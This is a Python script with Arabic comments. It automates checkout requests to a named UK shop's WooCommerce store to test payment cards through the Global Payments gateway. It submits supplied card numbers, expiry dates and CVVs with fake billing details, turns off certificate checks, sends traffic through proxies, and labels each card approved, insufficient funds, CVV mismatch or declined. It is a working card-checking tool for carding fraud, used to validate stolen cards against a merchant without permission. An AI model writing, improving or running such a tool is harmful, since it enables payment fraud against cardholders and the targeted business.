"""
بوابة الدفع: Global Passed LookUp Single
الموقع: mx5oc.co.uk
نوع البوابة: Global Passed LookUp Single
تدفق الطلبات:
1. GET /checkout/ -> تهيئة الجلسة
2. POST /?wc-ajax=checkout -> إرسال بيانات البطاقة والحصول على النتيجة
"""
import aiohttp
import asyncio
import uuid
import ssl
import json


async def req1_init_session(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> None:
    """الخطوة 1: تهيئة الجلسة عبر GET لصفحة الدفع."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://mx5oc.co.uk/checkout/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            await r.text()
    except Exception as e:
        raise RuntimeError(f"req1_init_session failed: {e}") from e


async def req2_submit_checkout(
    session: aiohttp.ClientSession,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إرسال طلب الدفع والحصول على نص الاستجابة."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    payload = {
        "billing_first_name": "John",
        "billing_last_name": "Doe",
        "billing_country": "GB",
        "billing_address_1": "10 Downing Street",
        "billing_city": "London",
        "billing_postcode": "SW1A 2AA",
        "billing_phone": "07700900123",
        "billing_email": f"test_{uuid.uuid4().hex[:8]}@gmail.com",
        "payment_method": "globalpayments_gpapi",
        "terms": "on",
        "globalpayments_gpapi_card_number": cc,
        "globalpayments_gpapi_card_expiry": f"{mes}/{ano[-2:]}",
        "globalpayments_gpapi_card_cvv": cvv,
    }
    try:
        async with session.post(
            "https://mx5oc.co.uk/?wc-ajax=checkout",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req2_submit_checkout failed: {e}") from e


async def process_GP_single_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Global Passed LookUp Single."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            await req1_init_session(session, proxy_url)
            response_text = await req2_submit_checkout(session, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "success" in response_text.lower() or '\"result\":\"success\"' in response_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient funds" in response_text.lower():
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "incorrect_cvc" in response_text.lower() or "cvv_failing" in response_text.lower():
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN Matched (Wrong CVV)"
    elif "declined" in response_text.lower():
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Declined"
    else:
        try:
            res_json = json.loads(response_text)
            response_msg = res_json.get("messages", "Error Processing")
            if isinstance(response_msg, list):
                response_msg = " ".join(response_msg)
            elif isinstance(response_msg, dict):
                response_msg = str(response_msg)
        except Exception:
            response_msg = "Error Processing"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", response_msg
